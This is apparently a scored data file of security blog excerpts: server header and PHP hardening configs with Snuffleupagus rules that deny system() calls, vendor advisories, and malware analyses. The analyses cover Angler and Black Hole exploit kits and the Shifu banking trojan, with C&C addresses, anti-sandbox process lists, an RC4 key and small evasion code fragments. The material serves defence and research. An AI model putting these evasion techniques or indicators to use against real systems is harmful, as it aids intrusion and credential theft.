Nginx,0.008349916371733657
"add_header Strict-Transport-Security ""max-age=31536000; includeSubdomains; preload"";
add_header 'Referrer-Policy' 'same-origin';
add_header X-Content-Type-Options nosniff;
add_header X-Frame-Options SAMEORIGIN;
add_header X-Robots-Tag ""noindex, nofollow, nosnippet, noarchive"";
add_header X-XSS-Protection ""1; mode=block"";
add_header Content-Security-Policy ""base-uri 'none'; default-src 'self'; child-src;connect-src 'self'; form-action 'self'; frame-ancestors 'none'; img-src 'self' data:; media-src 'none'; object-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; report-uri /csp-report; report-to /csp-report;""",0.02864469970022976
Caddy,0.008249178445322025
"header / {
Strict-Transport-Security ""max-age=31536000; includeSubdomains; preload""
Referrer-Policy 'same-origin'
X-Content-Type-Options nosniff
X-Frame-Options SAMEORIGIN
X-Robots-Tag ""noindex, nofollow, nosnippet, noarchive""
X-XSS-Protection ""1; mode=block""
Content-Security-Policy ""base-uri 'none'; default-src 'self'; child-src;connect-src 'self'; form-action 'self'; frame-ancestors 'none'; img-src 'self' data:; media-src 'none'; object-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; report-uri /csp-report; report-to /csp-report;""
}",0.030481185846075953
Apache,0.011691551677925682
"Header always set Strict-Transport-Security ""max-age=31536000; includeSubdomains; preload""
Header always set Referrer-Policy 'same-origin'
Header always set X-Content-Type-Options nosniff
Header always set X-Frame-Options SAMEORIGIN
Header always set X-Robots-Tag ""noindex, nofollow, nosnippet, noarchive""
Header always set X-XSS-Protection ""1; mode=block""
Header always set Content-Security-Policy ""base-uri 'none'; default-src 'self'; child-src;connect-src 'self'; form-action 'self'; frame-ancestors 'none'; img-src 'self' data:; media-src 'none'; object-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; report-uri /csp-report; report-to /csp-report;""",0.024252980319872552
"While setting the correct security HTTP headers is a good first step to mitigate some attacks, it’s not sufficient.
That’s why AdwCleaner’s backend PHP stack is also hardened to higher the cost of exploiting vulnerabilities.
Hardening PHP
The problem we’re trying to solve is to restrict the language surface that the application can access to:",0.011362264573332559
"block access to specific functions.
give access only to a restricted set of files and classes.
sanitize various functions inputs.
restrict execution to read-only PHP files and deny it on writable ones.
replace rand() and mt_rand() by random_int().",0.008434592775558802
"This may sound simple, but it becomes quickly complex to manage at large scale, especially without tinkering with the application source code.
Since we’re in 2017, we use PHP7, meaning that we cannot use Suhosin any longer, as it’s only working with PHP5 and below. We’re not alone in this situation. Thus, some fine people developed Snuffleupagus, a PHP7+ extension that takes a lot of inspiration from Suhosin but with extended capacities and a more industrialized usage.
Snuffleupagus logo – an elephant as majestic as PHP itself
Snuffleupagus mitigates issues in two main ways:",0.012504022668802905
"Kill bug classes at once
Patch PHP functions",0.008118967411734346
"Killing bug classes at once is pretty handy: Instead of writing a rule for every situation, it’s possible to write a generic rule which will mitigate numerous bugs. For instance, mail() RCE, weak PRNG, permissive chmod() , system injections, or file upload RCE can be easily fixed using only one or two rules to address the whole bug family.
A practical example using file-upload RCE:
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)
This gives countless RCEs (CVE-2001-1032, CVE-2016-9187…). It’s possible to mitigate it using the following directive:
sp.upload_validation.script(""tests/upload_validation.sh"").enable();
Where the file tests/upload_validation.sh return 0 to allow and any other value to deny the upload – vld is pretty useful for that:
$ php -d vld.execute=0 -d vld.active=1 -d extension=vld.so $file
That way any upload containing PHP code will be dropped.
Another feature valuable for our use case is virtual patching. It allows fine-grained settings for functions. For instance, I want to allow a call to system(“id”) but I don’t want to allow any other system calls. The rules would look like:
sp.disable_functions.function(""system"").param(""cmd"").value(""id"").allow();
sp.disable_functions.function(""system"").param(""cmd"").drop();",0.010884412863942705
"Since the rules are evaluated in order, we first allow a call to system with id as the cmd argument, and we then drop all other rules.
It’s also possible to write rules for a specific filename (filename(name)), hash (hash(sha256)), return value (ret(value)) or type (ret_type(type_name)), and client ip (cidr(ip/mask)). Also, the behaviour can be adapted. If it triggers a rule:",0.010266060525694232
"drop(): drop the request
simulation(): only log the event without blocking it
allow(): allow the request
dump(): dump the request in a directory",0.010719829405084425
"An entry in the PHP logfile is written when an event is triggered, for instance:
2017/10/08 07:30:19 [error] 625#625: *54641 FastCGI sent in stderr: ""PHP message: [snuffleupagus][0.0.0.0][include][drop]
Inclusion of a forbidden file (/a/path/to/a/webroot/../../../)"" while reading response header from upstream,
client: <redacted>, server: adwcleaner.example.com, request: ""GET / HTTP/2.0"", upstream: ""fastcgi://unix:/var/run/php/php7.0-fpm.sock:"", host: ""adwcleaner.example.com""",0.009609673976719635
"Since no one likes writing rules by hand, a nice way to start is by using a script that parses the application PHP files, computes the hash of functions containing dangerous functions, and generates rules based on the results—only the files with the corresponding hashes will be allowed to execute these functions.
We generate new customized rules at every update pushed in production, alongside a set of default rules that are always valid (like system calls, uploads validation, and read-only execution). Since the log format is easy enough to parse, we can trigger notifications when a request has been blocked by one of the rules and act accordingly:
Mail notification sent when a snuffleupagus rule has been triggered.",0.014730935516868437
"The documentation is available on ReadTheDocs along with slides from their talk at BerlinSide, Hack.lu, and BlackAlps.
Conclusion
This article covered only two of the multiple measures we take to secure AdwCleaner‘s backend. Although some of these vulnerabilities can be mitigated client-side using browsers add-ons like NoScript, it’s always better to fix them as soon as possible using the easy techniques explained above. More hardening can be done at the OS and network level, and you can refer to our previous article about TLS to learn more about some of these.
",0.010146669857172719
OpenSSL man-in-the-middle vulnerability – Network Gateway product patch information,0.006617554926920399
"Written by
Chris McCormack",0.009511367839243778
"June 06, 2014",0.008425213196877168
Network Partners Products & Services Email Appliance OpenSSL Sophos Web Gateway SUM up2date UTM,0.008352133725195943
"On June 5th, 2014 a vulnerability (CVE-2014-0224) was found in OpenSSL that impacts our network security products. Fortunately, as of the publication of this article, there are no known in-the-wild attacks. Of course, as you’ve come to expect from Sophos, we’ve wasted no time in getting to work on patches to fix this vulnerability.
The vulnerability exists in OpenSSL and can allow an attacker using a man-in-the-middle attack to decrypt and modify traffic between a vulnerable client and server. Both client and server must be vulnerable for this exploit to work. OpenSSL versions 1.0.1 and 1.0.2-beta are affected.",0.009276766938061454
"At this time, we believe other vulnerabilities discovered this week in OpenSSL do not impact our network security products.
The following Sophos Network Security products and versions require a patch – we are working on them with the highest priority:",0.012927926939927947
"Sophos UTM v9.2
Sophos UTM v9.1
Sophos UTM v8.3
SUM v4.1/4.2
Sophos Web Appliance v3.9.x.x
Sophos Email Appliance v3.7.x.x
PureMessage for UNIX",0.015950967740176458
"For further information on all affected Sophos products, including patch availability, read the Knowledgebase article.
Once available, updates will be provided by the normal means for your product.
Fortunately, this vulnerability with OpenSSL does NOT require new SSL certificates to be deployed.
We will update this article with more information as it becomes available so check back regularly.
If you wish to discuss this, there is an active thread on the User Bulletin Board (for UTM) and SophosTalk Forums (for other network security products).
Update:
More information on the vulnerability, other products affected and how you can protect yourself, are outlined in our latest blog article on this subject.",0.012152536671012903
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"New critical vulnerability discovered in open-source office suites
A great number of attack techniques these days are using Microsoft Office documents to distribute malware. In recent years, there has been serious development on document exploit kit builders, not to mention the myriad of tricks that red-teamers have come up with to bypass security solutions.
In contrast to drive-by downloads that require no user interaction, document-based attacks usually incorporate some kind of social engineering component. From being lured into opening up an attachment to enabling the infamous macros, attackers are using all sorts of themes and spear phishing techniques to infect their victims.
While Microsoft Office gets all of the attention, other productivity software suites have been exploited before. We recall the Hangul Office Suite, which is popular in South Korea and was used by threat groups in targeted attacks.
Today we look at a vulnerability in LibreOffice, the free and open-source office suite, and OpenOffice (now Apache OpenOffice) available for Windows, Mac, and Linux. The bug (CVE-2018-16858) was discovered by Alex Inführ, who responsibly disclosed it and then published the results with an accompanying proof of concept on his blog.
Proof of concept code exploiting the vulnerability and launching the calculator
An attacker could take advantage of this bug to execute remote code, which could lead to compromising the system. The flaw uses a mouseover event, which means the user would have to be tricked into placing their mouse over a link within the document. This triggers execution of a Python file (installed with LibreOffice) and allows parameters to be passed and executed.
We tested several proof of concepts shared by John Lambert.  The process flow typically goes like this: soffice.exe -> soffice.bin -> cmd.exe -> calc.exe",0.007595754826343004
"The vulnerability has been patched in LibreOffice but not in Apache OpenOffice—yet. Malwarebytes users were already protected against it without the need for a detection update.
Time will tell if this vulnerability ends up being used in the wild. It’s worth noting that not everyone uses Microsoft Office, and threat actors could consider it for targeting specific victims they know may be using open-source productivity software.
",0.00925494511247238
"Yesterday, two different 0 day exploits against Internet Explorer were published, just in time for the holidays when most of you (and many security researchers as well) are taking time off from work. The exploit, named CVE-2010-3971, is fairly serious, affecting the latest builds of IE versions 6 through 8.
Well, I’d normally get all hot and bothered about the fact that this kind of event might force some of our research team to spend their precious vacation time working the problem and coming up with a comprehensive solution. Normally, but not this time.
This time we headed the Black Hats off at the pass, and put a stop to these shenanigans before they started. Word from the Webroot Web Security Service team — the builders of our very slick cloud protection service for businesses — is that their Javascript heuristics engine is able to block any Web page that’s trying to use the exploits to try to take over your computer. The screenshot above shows what happened when we tried to browse to the proof-of-concept exploit page on a machine protected by the Web Security Service.
Of course, that’s great for corporate folks, but what about our home users running Webroot Antivirus or Internet Security Essentials or Complete? Well, we block it there, too. If you happened to stumble upon a Web page with the exploit running inside it, you might see a popup like the screenshot here, which is just telling you that we’ve prevented the page containing the exploit from loading in your browser. For the people playing at home, please ensure that you’re running the latest version of your antivirus with the most current updates, with the File System Shield and the Execution Shield turned on (and turn Gamer Mode off while you’re surfing).
So, tough luck exploit writer guys. Better luck next time. I know someone is getting a bigger lump of coal than usual in his stocking this year, and I can’t think of anybody who deserves it more.
",0.01383435706058811
"Hacked Japanese porn sites spread banking malware attack
Thinking of spending some time perusing Japanese porn websites before you do your online banking? Security researchers at ESET have analysed an organised malware campaign that stole the login credentials of online banking customers after infecting PCs that had visited X-rated websites.",0.017208309103548425
16 Jul 2014 - 11:41AM,0.010795063151242124
Thinking of spending some time perusing Japanese porn websites before you do your online banking? Security researchers at ESET have analysed an organised malware campaign that stole the login credentials of online banking customers after infecting PCs that had visited X-rated websites.,0.016996242986367927
Thinking of spending some time perusing Japanese porn websites before you do your online banking?,0.010985772594563237
You might want to think again.,0.020875972030956036
Security researchers at ESET have published a detailed analysis of an organised malware campaign that stole the login credentials of online banking customers after infecting PCs that had visited X-rated Japanese websites.,0.01792986901797944
"ESET’s team of experts have taken a close look at the Win32/Aibatook malware that targets users of Internet Explorer who are customers of Japanese banks, and in particular visitors to some of the country’s most popular pornographic websites:",0.010377581517509449
"sokuhabo.net
www.uravidata.com
ppv.xxxurabi.com
mywife.cc",0.011739447966878869
"Upon visiting any of the above compromised sites, users can be redirected to an exploit page that attempts to take advantage of Java vulnerability CVE-2013-2465.",0.009798804010607953
"Of course, it’s important to point out that any website can potentially be compromised, and be running malicious code designed to infect a visiting computer. It’s not the case that an adult website is necessarily more dangerous to your computer’s health than, say, the website belonging to a major American television network or a website devoted to a programming language.",0.011671101190013022
"But criminals eager to break into bank accounts certainly have no qualms about hacking porn websites, in the knowledge that they are likely to receive lots of traffic (and hence guaranteed to generate more victims).",0.021113966878787527
"It is perhaps unusual, however, to see only one single vulnerability exploited – rather than the more common approach used by cybercriminals today to use an exploit kit to attempt a battery of attacks against visiting computers, hoping to find one which hits the bullseye.",0.016044750926611173
"Regardless, the criminals clearly think that their approach works well enough, and an unassauming 404 error message is displayed when the user’s browser is redirected to a third-party website.",0.011356358736667294
"The 404 “Page not found” error message may seem unassuming enough to the casual observer, but a quick look at the webpage’s source code reveals that is more than a simple error page – and secretly harbours code to run a malicious Java applet.",0.011890807936806969
"In a seeming attempt to avoid detection, the code contains a counter which appears to be designed to only insert the snippet of HTML for a limited number of victims each day.",0.010447999311124057
"With the malware now in place, it can begin to do the rest of its dirty work – waiting for victims to log into online banks with Internet Explorer (the most widely-used browser in Japan) and inject bogus forms into the process.",0.011180047591116127
"In the above example, the Aibatook malware has silently injected a false login page as a user visits the Japan Post bank, requesting that they fill in their personal details because of a system upgrade.",0.010543832841560907
Stolen data is then sent to the criminals via a C&C (Comamnd and Control) server.,0.010004386680835808
"Craftily, if the user visits a page on the Japan Post website designed to warn customers of the dangers of phishing attacks they are redirected back to the login page before they have a chance to see any security advice.",0.01075663720089981
"In recent months, those responsible for the Aibatook attack have created new versions of the malware, capable of stealing credentials from users of web-hosting services and domain resellers, and switching from Delphi to C++ as their programming language of choice.",0.010732497567738974
"In all, customers of over 90 websites are thought to be being targeted by the information-stealing criminals.",0.016322932725582162
Java vulnerability to blame,0.005692223924186002
The Java vulnerability exploited by the attacks was patched by Oracle back in June 2013.,0.013772518905491693
"In an ideal world you would hope that because a fix was available for the vulnerability, no one would have still been falling foul of the attack in the months since. However, it’s clear that many computer users are not protecting their computers with the latest security patches – giving online criminals a larger window of opportunity to infect PCs and steal money from online accounts than they could hope for in their wildest dreams.",0.01220762366472905
"The simple truth is that when computer users fail to keep their systems updated with security patches they are exposing themselves to greater risk, and making life easier for malicious hackers.",0.017728845447718133
Computer users should also consider carefully what other steps they are taking to minimise the attack surface.,0.016066792381556505
"Just about every piece of software you run on your computer has vulnerabilities – whether they be known or unknown. Most, hopefully, are not serious and cannot be easily exploited by hackers.",0.01156789825015836
"But every additional piece of code or functionality that you enable on a PC increases the potential risk. A smaller attack surface makes the exploitation of vulnerabilities more difficult, and so will help mitigate risk.",0.010580699431820273
"With that in mind, all computer users should ask themselves: Do I need to run Java in my web browser?",0.020374476350464965
"Java is probably the most targeted development platform for exploit attacks, and some reports have suggested that a gob-smacking 50% of all exploits target Java.",0.012184711859795083
"Over the last few years, it has become increasingly common to find cybercriminal gangs exploiting Java vulnerabilities – as it is so commonly installed, and has a poor history when it comes to security holes.",0.01417170831446457
"As a result, and you might have guessed this, Java is not my favourite cup of tea.",0.013195199446531802
"Although it’s true that there are some specific applications that need Java, my suspicion is that most computer users could get by just fine without having it enabled in their browser. Even if they do need it for one or two specific sites or applications, it might be better – from the security point of view – to disable Java in the browser and use a *different* browser when you need to access those sites.",0.011802702061511128
"If you’re not sure if you need Java enabled, ask your IT support desk or turn it off on your home computer and see if anything stops working. If you don’t notice any difference in your day-to-day browsing of the web, chances are that you never needed it turned on at all.",0.01615014722054986
Congratulations – you’ve just made your computer a whole lot safer.,0.019684513507507773
"Not that I’m recommending, of course, that you now visit Japanese porn websites…
",0.013725479448100875
"Stuxnet Paper Revision
The Stuxnet analysis “Stuxnet under the Microscope” we published a few weeks ago has been updated...",0.014464889024703997
David Harley,0.00885109592441069
15 Oct 2010 - 12:28PM,0.01134342672938582
The Stuxnet analysis “Stuxnet under the Microscope” we published a few weeks ago has been updated…,0.007321790323706279
"The Stuxnet analysis “Stuxnet under the Microscope” we published a few weeks ago has been updated, as promised, to include some information about the recently-patched win32k.sys vulnerability (MS10-073, or CVE-2010-2743), and just a little about the Task Scheduler issue that hasn’t been patched yet.",0.01155618810174075
"Randy Abrams has filled a hole in Babelfish’s functionality by blogging his translation from the classical Geek of the paper to what passes for English in the US. ;-) Well, it’s all Geek to me. [Insert your own favourite Trojan pun here.]",0.012454132792427353
I’m afraid the paper now runs to a hefty 72 pages…,0.01041400049610397
"David Harley CITP FBCS CISSP
ESET Senior Research Fellow
",0.011179100245160778
"Malvertising Strikes on Adult Site xHamster Again
We identified a malvertising campaign taking place on adult site xHamster (Alexa rank #68, est. 514 million visitors/month according to SimilarWeb) that abused ad provider TrafficHaus and Google’s URL shortener service.
This incident reminds us of a similar one that happened at the end of January also involving the same ad network.
Simply going on xHamster’s website could infect a PC if the browser or one of its plugins was not up to date. We notified TrafficHaus which responded immediately to shutdown the malicious ad, helping to limit the number of victims.
The redirection chain used by the criminals was quite effective in that it only strikes one time per IP address and cleverly hides itself within an innocuous piece of code.",0.011272387359152036
"Booby trapped advert
As we often see it, the malvertising was embedded along side an advert displayed on xHamster’s website, in this case the one displayed on the bottom right corner.
The screenshot below shows the source code behind the advert with the legitimate ad code (in blue) and the malicious code (in red) that was inserted by rogue actors.",0.012200470526505192
The malicious script builds a goo.gl URL (which is Google’s URL shortener) that is then used to forward the victims to the Angler Exploit Kit.,0.01199482407893071
"Although Google did eventually blacklist the URL, it should be noted that cyber crooks are constantly rotating through new shortened links, making this a cat and mouse game, where the mouse tends to always win.
Traffic overview and exploit kit",0.017372380294122802
"The Angler EK landing page attempts to detect if the user is running Kaspersky:
var tmp, x0 = 'Kaspersky.IeVirtualKeyboardPlugin.JavascriptApi.',
or Norton:
var r0 = ""res://C:\\Program Files"",
r1 = ""Norton"",
r2 = ""Internet"",
r3 = ""Security"",
r4 = ""Engine"",
r5 = ""with Backup"",
r6 = ""asOEHook.dll"",
r7 = ""uiMain.dll"",
r8 = ""msouplug.dll"",
to decide whether it should fire or not.",0.011142351470194822
"In this attack, only Internet Explorer was exploited via CVE-2014-4130 (a memory corruption vulnerability) successfully blocked by Malwarebytes Anti-Exploit:",0.012053532761878372
"Malware payload
The payload is Bedep and its ad fraud component.",0.012178177333836526
Within a minute the user’s machine is flooded with traffic to various ad networks to generate fraudulent ad revenues.,0.016034729578717766
"As if one infection wasn’t enough, Bedep also silently loads the Magnitude exploit kit (this has been spotted before). This means that victims already compromised by Angler EK could in turn be served another exploit kit and additional malware payload.
This is probably a case where multiple criminal “customers” want to have a piece of the infected PC and have to share it. But after all, the same computer can be monetized simultaneously by various actors: some ad fraud, some spam, and maybe a banking Trojan?
Conclusion
Angler EK has been one of the most active and advanced exploit kits in recent months. We have observed countless attacks via malvertising taking advantage of recently patched security flaws.
As an end user, you need to ensure that your computer is fully patched and that you are using the right tools to protect your assets. Malwarebytes Anti-Exploit prevents attacks that take advantage of software vulnerabilities, whether they are known or unknown (i.e zero days).
Malwarebytes Anti-Exploit users were protected against this malvertising on xHamster, even if their computers were not patched (not recommended). If you believe you may have been infected, feel free to run a scan with our Anti-Malware.
",0.014976713032976208
"Cybercriminals are currently mass mailing millions of emails impersonating eBay and PayPal in an attempt to trick end and corporate users into clicking on the malicious links found in the emails. Upon clicking on any of them, user are exposed to the client-side exploits served by the Black Hole exploit kit.
More details:",0.012650608264351826
Screenshot of the spamvertised PayPal themed email:,0.009557455454084818
"Upon clicking on the link, users are exposed to the following bogus “Page loading…” page:",0.010310956564353213
"Spamvertised URLs: hxxp://deafstudiestrust.org.uk/avail.html; hxxp://tomstexascountycourthouses.com/wp-content/uploads/fgallery/avail.html
Client-side exploits serving URL: hxxp://toeplunge.org/main.php?page=298e0c1b89821c16
The same client-side exploits serving URL has been used in another recently profiled spamvertised  campaign, this time impersonating AICPA.
Client-side exploits served: CVE-2010-0188; CVE-2010-1885
Upon successful client-side exploitation, the campaign drops MD5: 96f7c9d231bc5835e4a7c07bc94c5b4a on the affected hosts, currently detected by 2 out of 41 antivirus scanners as UDS:DangerousObject.Multi.Generic; WS.Reputation.1
Once executed, the sample will phone back to hxxp://87.204.199.100:8080/mx5/B/in. We’ve also seen the same C&C used in yet another previously profiled spamvertised campaign, this time impersonating Craigslist.
Based on these observations, we can easily conclude that a single cybercriminal or a gang of cybercriminals is systematically introducing undetected malicious executables and rotating the client-side exploits serving URLs, next to impersonating popular brands in an attempt to socially engineer users into interacting with these malicious emails.
This is the second PayPal/eBay themed malicious campaign that we’ve intercepted and profiled in recent months. We predict that due to the obvious high click-through rates thanks to the systematic rotation of the malicious domains and impersonated brands, we’ll see more campaigns abusing their trusted Web reputation.
PayPal has information on their website to help users identify legitimate emails.
Webroot SecureAnywere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.011462298320624287
"Shifu – the rise of a self-destructive banking trojan
2015-11-02",0.007950377758319638
"Floser Bacurio Jr
Fortinet
,
Singapore",0.009585435432388545
"Wayne Low
Fortinet
,
Singapore
Editor:
Martijn",0.009558873742864904
"Grooten
Abstract
The banking trojan Shifu appears to inherit some of its features from several other well-known banking trojans. Floser Bacurio and Wayne Low decided to take a close look at one of its droppers.
Copyright © 2015 Virus Bulletin",0.011690264420721075
"Following takedown operations against various notorious banking trojans, including Zeus, Dridex and Gozi, a freshly brewed banking trojan, Shifu, has recently made the news; we believe it inherits some features from the earlier well-known banking trojans. We decided to dive deeper into one of its droppers (MD5: E60F72FFA76386079F2645BE2ED84E53; SHA1: 963BFC778F94FE190FDD1DD66284E9BC9DD2BED6). A number of features caught our eye when looking at its underlying code.",0.013875397522720379
Dropper,0.007346994522496653
"Exploiting CVE-2015-0003
On our first look at the dropper, we observed that the dropper code is not heavily obfuscated, although most of the strings are encoded; it turns out that the strings can easily be decoded using a simple XOR operation.
At the entry point, we can immediately tell that Shifu attempts to exploit a local privilege escalation vulnerability. The vulnerability was assigned the CVE number CVE-2015-0003 in February 2015 and can be used to elevate the privilege of a process to system privilege on Windows 7 and above. The exploit code can easily be found on the Internet, so it is not surprising that the malware attempts to exploit this (patched) vulnerability. This means that the malware may not execute properly without sufficient privileges and also serves as a reminder that Windows users should always install the latest Windows updates.
After performing the local privilege escalation routine, we arrive at the code where the malware will extract the payloads embedded in its binary. The payloads consist of two aPLib compressed blobs for 32-bit and 64-bit platforms, which is a very common technique used by malware nowadays. The use of the aPLib compressor suggests that Shifu might have adopted some of the techniques used by malware like Zeus (aka Zbot) or Rovnix (and thus Carberp), for which the source code has been leaked.",0.010086444860162969
"Malware don’t like HIPS
One of the most notable things observed in the code injection routine is an attempt to obfuscate the MZPE header by overwriting random bytes in it. This action does not affect the execution of the payload since the payload code will be injected into the memory of the remote process and will be executed directly in the context of the remote process via an asynchronous thread. The purpose of overwriting bytes in the MZPE header is to defeat behavioural analysis systems and HIPS technology – with a corrupted MZPE header, the sample does not look like a legitimate binary file and could thus bypass some trivial PE signature checks.
Figure 1. Corrupting the MZPE header.",0.01042594533407648
"Code obscuring
Analysing the decompressed buffer directly might result in an incorrect AddressOfEntryPoint as Shifu’s author has intentionally obfuscated the entry point address by XORing with a widely used XOR key, 0x31337, throughout the program regardless of the dropper or payload. Shifu will first try injecting the payload code into explorer.exe. When the code injection into explorer.exe fails, to play it safe, Shifu’s author implements an additional routine which will create or spawn a random Windows process found in C:\Windows\system32, or in C:\Windows\syswow64 if it is a 64-bit platform. Under normal circumstances, most Windows executable files (for instance svchost.exe) can be executed, but will quit immediately when called by non-Windows services. In order to circumvent this behaviour, Shifu first creates a suspended Windows process and then injects an infinite sleep, Sleep(-1), routine and executes it in the memory of the suspended process. After that, the suspended process will be resumed and continue execution, but it will not quit immediately unless it is forced to exit explicitly. Once the targeted process has been determined, Shifu will carry out another code injection routine to execute the payload via CreateRemoteThread or RtlCreateUserThread (Figure 2).
Figure 2. Remote code execution using CreateRemoteThread/RtlCreateUserThread.",0.015761469617785462
"Anti-sandbox and anti-VM
There are many anti-sandbox and anti-VM detection techniques in the dropper, as is common in mal-ware nowadays. Some of these checks have been documented in a McAfee blog post [1], so Table 1 lists some of the process names, as well as their hashes (computed by checking well-known process names using the Windows API function RtlComputeCrc32) that are ‘blacklisted’ by Shifu. Shifu checks a list of active processes running on the machine, as well as the sample’s file name, against hard-coded CRC32 hashes in order to avoid the malware being analysed by a sandbox or by virtual machines that are built to perform dynamic analysis of malware samples.
Process name
CRC32 hash
vmwareuser.exe
0x99DD4432
vmwaretray.exe
0x1F413C1F
vboxservice.exe
0x64340DCE
vboxtray.exe
0x63C54474
wireshark.exe
0x77AE10F7
procmon.exe
0x5BA9B1FE
procexp.exe
0x3CE2BEF3
fortitracer.exe
0x332FD095
ollydbg.exe
0xAF2015F2
python.exe
0xD2EFC6C4
sysanalyzer.exe
0x4231F0AD
sniff_hit.exe
0xD20981E0
joeboxserver.exe
0x2AAA273B
joeboxcontrol.exe
0x777BE06C
Table 1. Process names that are ‘blacklisted’ by Shifu.
It also employs a check against the file names shown in Table 2.
Dropper’s file name
CRC32 hash
sample.exe
0xE84126B8
malware.exe
0x3C164BED
test.exe
0xC19DADCE
Table 2. File names that are checked.",0.01519831806690597
"Payload
On analysing the decompressed payload using a disassembler, it turns out that we have landed at an invalid code entry point, as mentioned in the previous section, and the disassembler will complain that the import address table is corrupted. The payload cannot be analysed in a disassembler directly without first ‘fixing’ the file. We later realized that, besides the code entry point obfuscation, Shifu’s author has also deployed some other trivial tricks to the payload to mislead analysts:
Obfuscating the import table address – the original import table address can be restored by XORing with the key 0x31337.
Obfuscating import function names (Figure 3 and Figure 4) – the function names are encoded using the static XOR key 0xFF. (In the Appendix, we provide a simple IDAPython script to fix the function names under IDA Pro.)
Figure 3. Obfuscated import function names.
Figure 4. Shifu deobfuscating the import table address before loading the DLL by name.
(Click here to view a larger version of Figure 4.)
Shifu’s author also utilized multi-threading to add complexity to the malware and make dynamic analysis more challenging. On the other hand, from a static analysis perspective, the malware’s encoding/encryption routine is insignificant and most of the strings in the binary can trivially be decoded and fixed within IDA Pro with a few lines of code (Figure 5). However, some of the strings, such as the command-and-control server name, are encrypted using RC4.
Figure 5. A simple script to decode the encoded string.
(Click here to view a larger version of Figure 5.)",0.016477412791133128
"Multiple process code injection
Before Shifu is able to carry out its wide range of information-stealing activities, it needs to make sure its payload code will be injected into the relevant processes. When the payload is injected by the dropper, the very first thing it will do is traverse the running processes and transfer its code into any process that does not already contain it. In other words, all the active processes apart from the system processes will contain a copy of the payload code whenever the machine is infected.
Afterwards, a named pipe will be created in order to allow communication between the payloads in different processes.",0.009339225736364254
Comprehensive data theft features,0.008941212670156462
"Keylogger and screenshot capture
Looking into Shifu’s data theft features, we could see that the malware is equipped with some of the keylogging features found in traditional keyloggers, as well as having the ability to steal numerous banking credentials from the victim. Shifu also uses the Windows API-hooking technique in order to steal other credentials. Table 3 shows a short summary of the hooked Windows APIs along with their respective purposes.
Hooked Windows API
Purpose
User32!GetClipboardData
Captures the ASCII and UNICODE text currently saved in the clipboard window
User32!TranslateMessage
Captures the keyboard’s keystrokes
User32!GetMessageA/User32!GetMessageW
The hook’s handler performs the same thing as the user32!TranslateMessage hook’s handler
Table 3. Hooked Windows APIs and their purposes.
Under normal circumstances, these Windows API hooks should be able to capture the keystrokes on an infected machine. However, Shifu also tries to capture virtual keyboards, which are commonly used in Internet banking, by taking screenshots of the infected machine whenever the malware detects a mouse click. It is also noteworthy that the virtual keyboard screen will only be grabbed when the malware detects an opened screen with one of the following titles, all of which are used by Italian Internet banking websites:
Password
Telemaco
Scelta e Login dispositivo
TLQ Web
db Corporate Banking Web
SecureStoreCSP - enter PIN",0.011292968485672072
"Certificate capture
Shifu manipulates Windows API hooks in order to intercept the certificate password when a certificate is being imported to the certificate store. All the certificate blob data and passwords found in the Crypt32!PFXImportCertStore API will be intercepted, unless the process contains the string ‘torrent’.
The imported public keys on the infected machine will also be captured. This is possible, using the Windows Crypt32!CertEnumSystemStore API, without having access to the private key.
These hooks may be useful to the attackers when the victim imports certificates using a Windows PGP client like Gpg4win; the hook handlers could intercept the private key and certificate and save it to Shifu’s specified log directory as ‘randomhexavalue_cert.pfx’. Furthermore, it could be useful if the attackers want to access the cryptocurrency wallet downloaded from the victim machine, which is encrypted using an RSA key pair.
Shifu’s author and its operators will be able to abuse the stolen certificates for nefarious purposes.",0.00981303377203735
"Other data thefts
In line with the current cryptocurrency hype, Shifu also targets Bitcoin and Litecoin wallet files found on the victim’s machine. Shifu tries to steal VPN and VNC login credentials by checking the command line of running executables. If a remote desktop protocol (RDP or VNC) or VPN process is found with the configuration file name specified in the command line, Shifu attempts to save a copy of the configuration file.
It appears that this trojan steals far more information than a typical banking trojan would: from keylogging, screenshot capture, certificate capture and cryptocurrency wallet grabbing, to FTP and POP3 credentials grabbing. The malware also appears to target point-of-sale terminals for payment card data as well as some financial institutions themselves. It scans the machines if one of the following strings is found in the path of the executable file of the current process:
tellerplus
bancline
fidelity
micrsolv
bankman
vanity
episys
jack henry
cruisenet
gplusmain
silverlake
v48d0250s1
When a potential POS machine is found, the malware will send a flag, ‘ETC’, back to its C&C server. Based on the malware code, there is no immediate action after the machine has been recognized as a POS system; perhaps a memory-scrapping module will be deployed by the botnet operators to this machine at a later time.",0.013912474474405356
"Stealthy banking trojan stays under the radar?
When analysing Shifu’s Windows API-hooking mechanisms, we also discovered that the malware tries to remain hidden from the victim. The malware conceals its presence from the running processes by hijacking the Windows ntdll!ZwQuerySystemInformation API, which is called whenever a user-mode program attempts to enumerate a list of active processes using one of various process enumeration APIs. However, this is a well-known technique and is defeated by all modern security tools. Apparently, the purpose of this trick is to remain concealed from non-tech-savvy users, however what confused us is that the malware also hijacks Windows API calls used for DNS resolution, such as ws2_32!gethostbyname, ws2_32!getaddrinfo and ws2_32!GetAddrInfoExW, to redirect URLs that contain the pattern ‘secure\..*\.moz\..*’ to ‘google.com’. Essentially, this seems to dismiss the idea of the malware being stealthy, as hijacking a website is often a clear sign of infection.",0.014398323348309816
"Home sweet home
When a new machine is infected, the malware will report the new victim to the command-and-control (C&C) server by connecting to a domain that is hard-coded in the code, using the path ‘/news/userlogin.php’. The following is the information on the machine that will be stored in the botnet’s control panel (also see Figure 6):
botid – username and computer name
ver – botnet version
up – uptime of the infected machine
os – operating system identifier of the infected machine
ltime – local timestamp of the infected machine
token – existence of smart card information
cn – unknown
av – name of the security solution installed
dmn – domain name of the workstation
Figure 6. Machine information sent back to the C&C control panel.
All the data sent and received is obfuscated to prevent direct exposure by a packet sniffer program. The data is encoded and decoded using the RC4 algorithm with the key ‘a7zoSTHljZylEx4o3mJ2eqIdsEguKC15KnyQdfx4RTc5sjH’.
